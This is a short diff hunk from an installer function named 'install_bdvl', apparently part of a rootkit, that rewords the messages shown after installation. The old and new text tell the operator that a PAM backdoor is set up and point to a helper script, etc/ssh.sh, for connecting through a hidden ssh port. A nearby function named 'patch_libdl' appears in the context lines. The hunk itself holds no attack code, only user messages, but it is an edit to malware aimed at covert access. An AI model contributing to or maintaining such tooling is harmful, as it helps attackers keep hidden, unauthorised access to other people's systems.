@@ -467,11 +467,8 @@ install_bdvl()
     echo
 
     setup_home $IDIR
-    secho "Your backdoor home is set up. All you need to do is log into your"
-    secho "backdoor via ssh with the credentials you specified during installation."
-    secho "A script is available @ etc/ssh.sh which makes connecting with"
-    secho "your hidden port that bit easier."
-    secho "I recommend restarting this box's ssh service."
+    secho "Your PAM backdoor is set up."
+    secho "See 'etc/ssh.sh' on connecting with your hidden port."
 }
 
 patch_libdl()
